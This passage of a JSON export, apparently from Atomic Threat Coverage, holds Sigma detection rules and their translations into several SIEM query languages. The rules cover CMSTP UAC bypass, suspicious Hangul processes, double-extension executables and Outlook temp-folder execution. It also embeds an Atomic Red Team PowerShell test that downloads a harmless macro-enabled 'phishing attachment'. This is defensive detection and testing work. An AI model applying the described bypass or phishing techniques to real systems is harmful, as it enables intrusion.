\"CMSTP.exe\"", "product": "Azure Sentinel", "name": "CMSTP"}, {"query": "action: global\ntitle: CMSTP Execution\nid: 9d26fede-b526-4413-b069-6e24b6d07167\nstatus: stable\ndescription: Detects various indicators of Microsoft Connection Manager Profile Installer execution\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1191\n    - attack.g0069\n    - car.2019-04-001\nauthor: Nik Seetharaman\nreferences:\n    - http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\ndetection:\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "action: global\ntitle: CMSTP Execution\nid: 9d26fede-b526-4413-b069-6e24b6d07167\nstatus: stable\ndescription: Detects various indicators of Microsoft Connection Manager Profile Installer execution\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1191\n    - attack.g0069\n    - car.2019-04-001\nauthor: Nik Seetharaman\nreferences:\n    - http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\ndetection:\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high\n", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"12\" AND TargetObject.keyword:*\\\\\\\\cmmgr32.exe*) OR (EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\cmmgr32.exe*) OR (EventID:\"10\" AND CallTrace.keyword:*cmlua.dll*))\\nParentImage.keyword:*\\\\\\\\cmstp.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/CMSTP-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"CMSTP Execution\",\\n    \"description\": \"Detects various indicators of Microsoft Connection Manager Profile Installer execution\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1191\",\\n      \"attack.g0069\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"12\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\cmmgr32.exe*) OR (EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\cmmgr32.exe*) OR (EventID:\\\\\"10\\\\\" AND CallTrace.keyword:*cmlua.dll*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"12\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\cmmgr32.exe*) OR (EventID:\\\\\"13\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\cmmgr32.exe*) OR (EventID:\\\\\"10\\\\\" AND CallTrace.keyword:*cmlua.dll*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'CMSTP Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n          Details = {{_source.Details}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\ncurl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/CMSTP-Execution-2 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"CMSTP Execution\",\\n    \"description\": \"Detects various indicators of Microsoft Connection Manager Profile Installer execution\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1191\",\\n      \"attack.g0069\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\cmstp.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"ParentImage.keyword:*\\\\\\\\\\\\\\\\cmstp.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'CMSTP Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n          Details = {{_source.Details}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"12\" AND TargetObject.keyword:*\\\\\\\\cmmgr32.exe*) OR (EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\cmmgr32.exe*) OR (EventID:\"10\" AND CallTrace.keyword:*cmlua.dll*))\\nParentImage.keyword:*\\\\\\\\cmstp.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"12\" TargetObject=\"*\\\\\\\\cmmgr32.exe*\") OR (EventID=\"13\" TargetObject=\"*\\\\\\\\cmmgr32.exe*\") OR (EventID=\"10\" CallTrace=\"*cmlua.dll*\")) | table CommandLine,ParentCommandLine,Details\\nParentImage=\"*\\\\\\\\cmstp.exe\" | table CommandLine,ParentCommandLine,Details", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"12\" TargetObject=\"*\\\\\\\\cmmgr32.exe*\") OR (event_id=\"13\" TargetObject=\"*\\\\\\\\cmmgr32.exe*\") OR (event_id=\"10\" CallTrace=\"*cmlua.dll*\"))\\n(event_id=\"1\" ParentImage=\"*\\\\\\\\cmstp.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*12)(?=.*.*\\\\cmmgr32\\\\.exe.*))|.*(?:.*(?=.*13)(?=.*.*\\\\cmmgr32\\\\.exe.*))|.*(?:.*(?=.*10)(?=.*.*cmlua\\\\.dll.*))))'\\ngrep -P '^.*\\\\cmstp\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: CMSTP UAC Bypass via COM Object Access\nid: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253\nstatus: stable\ndescription: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1088\n    - attack.t1191\n    - attack.g0069\n    - car.2019-04-001\nauthor: Nik Seetharaman\nmodified: 2019/07/31\nreferences:\n    - http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\n    - https://twitter.com/hFireF0X/status/897640081053364225\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentCommandLine: '*\\DllHost.exe'\n    selection2:\n        ParentCommandLine:\n            - '*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '*{3E000D72-A845-4CD9-BD83-80C07C3B881F}'\n    condition: selection1 and selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Hashes\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: CMSTP UAC Bypass via COM Object Access\nid: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253\nstatus: stable\ndescription: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1088\n    - attack.t1191\n    - attack.g0069\n    - car.2019-04-001\nauthor: Nik Seetharaman\nmodified: 2019/07/31\nreferences:\n    - http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/\n    - https://twitter.com/hFireF0X/status/897640081053364225\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentCommandLine: '*\\DllHost.exe'\n    selection2:\n        ParentCommandLine:\n            - '*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '*{3E000D72-A845-4CD9-BD83-80C07C3B881F}'\n    condition: selection1 and selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Hashes\nfalsepositives:\n    - Legitimate CMSTP use (unlikely in modern enterprise environments)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentCommandLine.keyword:*\\\\\\\\DllHost.exe AND ParentCommandLine.keyword:(*\\\\{3E5FC7F9\\\\-9A51\\\\-4367\\\\-9063\\\\-A120244FBEC7\\\\} OR *\\\\{3E000D72\\\\-A845\\\\-4CD9\\\\-BD83\\\\-80C07C3B881F\\\\}))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/CMSTP-UAC-Bypass-via-COM-Object-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"CMSTP UAC Bypass via COM Object Access\",\\n    \"description\": \"Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.execution\",\\n      \"attack.t1088\",\\n      \"attack.t1191\",\\n      \"attack.g0069\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"(ParentCommandLine.keyword:*\\\\\\\\\\\\\\\\DllHost.exe AND ParentCommandLine.keyword:(*\\\\\\\\{3E5FC7F9\\\\\\\\-9A51\\\\\\\\-4367\\\\\\\\-9063\\\\\\\\-A120244FBEC7\\\\\\\\} OR *\\\\\\\\{3E000D72\\\\\\\\-A845\\\\\\\\-4CD9\\\\\\\\-BD83\\\\\\\\-80C07C3B881F\\\\\\\\}))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentCommandLine.keyword:*\\\\\\\\\\\\\\\\DllHost.exe AND ParentCommandLine.keyword:(*\\\\\\\\{3E5FC7F9\\\\\\\\-9A51\\\\\\\\-4367\\\\\\\\-9063\\\\\\\\-A120244FBEC7\\\\\\\\} OR *\\\\\\\\{3E000D72\\\\\\\\-A845\\\\\\\\-4CD9\\\\\\\\-BD83\\\\\\\\-80C07C3B881F\\\\\\\\}))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'CMSTP UAC Bypass via COM Object Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}\\\\n           Hashes = {{_source.Hashes}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentCommandLine.keyword:*\\\\\\\\DllHost.exe AND ParentCommandLine.keyword:(*\\\\{3E5FC7F9\\\\-9A51\\\\-4367\\\\-9063\\\\-A120244FBEC7\\\\} *\\\\{3E000D72\\\\-A845\\\\-4CD9\\\\-BD83\\\\-80C07C3B881F\\\\}))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentCommandLine=\"*\\\\\\\\DllHost.exe\" (ParentCommandLine=\"*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\" OR ParentCommandLine=\"*{3E000D72-A845-4CD9-BD83-80C07C3B881F}\")) | table CommandLine,ParentCommandLine,Hashes", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentCommandLine=\"*\\\\\\\\DllHost.exe\" ParentCommandLine IN [\"*{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\", \"*{3E000D72-A845-4CD9-BD83-80C07C3B881F}\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\DllHost\\\\.exe)(?=.*(?:.*.*\\\\{3E5FC7F9-9A51-4367-9063-A120244FBEC7\\\\}|.*.*\\\\{3E000D72-A845-4CD9-BD83-80C07C3B881F\\\\})))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1193/T1193.yaml", "command": "if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n", "name": null}], "command_list": ["if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n"], "technique_id": "T1193", "parsed_datasets": [{"Atomic Red Team Test - Spearphishing Attachment": {"display_name": "Spearphishing Attachment", "atomic_tests": [{"description": "The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).\nThe below will successfully download the macro-enabled Excel file to the current location.\n", "supported_platforms": ["windows"], "name": "Download Phishing Attachment - VBScript", "executor": {"elevation_required": false, "command": "if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n", "name": "powershell"}}], "attack_technique": "T1193"}}], "queries": [{"query": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nstatus: experimental\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.initial_access\n    - attack.t1059\n    - attack.t1202\n    - attack.t1193\n    - attack.g0032\nauthor: Florian Roth\ndate: 2019/10/24\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\Hwp.exe'\n        Image: '*\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nstatus: experimental\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.initial_access\n    - attack.t1059\n    - attack.t1202\n    - attack.t1193\n    - attack.g0032\nauthor: Florian Roth\ndate: 2019/10/24\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\Hwp.exe'\n        Image: '*\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\Hwp.exe AND Image.keyword:*\\\\\\\\gbb.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-HWP-Sub-Processes <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious HWP Sub Processes\",\\n    \"description\": \"Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.initial_access\",\\n      \"attack.t1059\",\\n      \"attack.t1202\",\\n      \"attack.t1193\",\\n      \"attack.g0032\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\Hwp.exe AND Image.keyword:*\\\\\\\\\\\\\\\\gbb.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\Hwp.exe AND Image.keyword:*\\\\\\\\\\\\\\\\gbb.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious HWP Sub Processes\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\Hwp.exe AND Image.keyword:*\\\\\\\\gbb.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\Hwp.exe\" Image=\"*\\\\\\\\gbb.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\Hwp.exe\" Image=\"*\\\\\\\\gbb.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\Hwp\\\\.exe)(?=.*.*\\\\gbb\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Double Extension\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable\n    file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\nauthor: Florian Roth (rule), @blu3_team (idea)\ndate: 2019/06/26\ntags:\n    - attack.initial_access\n    - attack.t1193\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: \n            - '*.doc.exe'\n            - '*.docx.exe'\n            - '*.xls.exe'\n            - '*.xlsx.exe'\n            - '*.ppt.exe'\n            - '*.pptx.exe'\n            - '*.rtf.exe'\n            - '*.pdf.exe'\n            - '*.txt.exe'\n            - '*      .exe'\n            - '*______.exe'\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Double Extension\nid: 1cdd9a09-06c9-4769-99ff-626e2b3991b8\ndescription: Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable\n    file in spear phishing campaigns\nreferences:\n    - https://blu3-team.blogspot.com/2019/06/misleading-extensions-xlsexe-docexe.html\n    - https://twitter.com/blackorbird/status/1140519090961825792\nauthor: Florian Roth (rule), @blu3_team (idea)\ndate: 2019/06/26\ntags:\n    - attack.initial_access\n    - attack.t1193\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: \n            - '*.doc.exe'\n            - '*.docx.exe'\n            - '*.xls.exe'\n            - '*.xlsx.exe'\n            - '*.ppt.exe'\n            - '*.pptx.exe'\n            - '*.rtf.exe'\n            - '*.pdf.exe'\n            - '*.txt.exe'\n            - '*      .exe'\n            - '*______.exe'\n    condition: selection\nfalsepositives: \n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:(*.doc.exe OR *.docx.exe OR *.xls.exe OR *.xlsx.exe OR *.ppt.exe OR *.pptx.exe OR *.rtf.exe OR *.pdf.exe OR *.txt.exe OR *\\\\ \\\\ \\\\ \\\\ \\\\ \\\\ .exe OR *______.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Double-Extension <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Double Extension\",\\n    \"description\": \"Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\",\\n    \"tags\": [\\n      \"attack.initial_access\",\\n      \"attack.t1193\"\\n    ],\\n    \"query\": \"Image.keyword:(*.doc.exe OR *.docx.exe OR *.xls.exe OR *.xlsx.exe OR *.ppt.exe OR *.pptx.exe OR *.rtf.exe OR *.pdf.exe OR *.txt.exe OR *\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ .exe OR *______.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:(*.doc.exe OR *.docx.exe OR *.xls.exe OR *.xlsx.exe OR *.ppt.exe OR *.pptx.exe OR *.rtf.exe OR *.pdf.exe OR *.txt.exe OR *\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ .exe OR *______.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Double Extension\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:(*.doc.exe *.docx.exe *.xls.exe *.xlsx.exe *.ppt.exe *.pptx.exe *.rtf.exe *.pdf.exe *.txt.exe *      .exe *______.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*.doc.exe\" OR Image=\"*.docx.exe\" OR Image=\"*.xls.exe\" OR Image=\"*.xlsx.exe\" OR Image=\"*.ppt.exe\" OR Image=\"*.pptx.exe\" OR Image=\"*.rtf.exe\" OR Image=\"*.pdf.exe\" OR Image=\"*.txt.exe\" OR Image=\"*      .exe\" OR Image=\"*______.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*.doc.exe\", \"*.docx.exe\", \"*.xls.exe\", \"*.xlsx.exe\", \"*.ppt.exe\", \"*.pptx.exe\", \"*.rtf.exe\", \"*.pdf.exe\", \"*.txt.exe\", \"*      .exe\", \"*______.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\.doc\\\\.exe|.*.*\\\\.docx\\\\.exe|.*.*\\\\.xls\\\\.exe|.*.*\\\\.xlsx\\\\.exe|.*.*\\\\.ppt\\\\.exe|.*.*\\\\.pptx\\\\.exe|.*.*\\\\.rtf\\\\.exe|.*.*\\\\.pdf\\\\.exe|.*.*\\\\.txt\\\\.exe|.*.*      \\\\.exe|.*.*______\\\\.exe)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Execution in Outlook Temp Folder\nid: a018fdc3-46a3-44e5-9afb-2cd4af1d4b39\nstatus: experimental\ndescription: Detects a suspicious program execution in Outlook temp folder\nauthor: Florian Roth\ndate: 2019/10/01\ntags:\n    - attack.initial_access\n    - attack.t1193\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\Temporary Internet Files\\Content.Outlook\\\\*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Execution in Outlook Temp Folder\nid: a018fdc3-46a3-44e5-9afb-2cd4af1d4b39\nstatus: 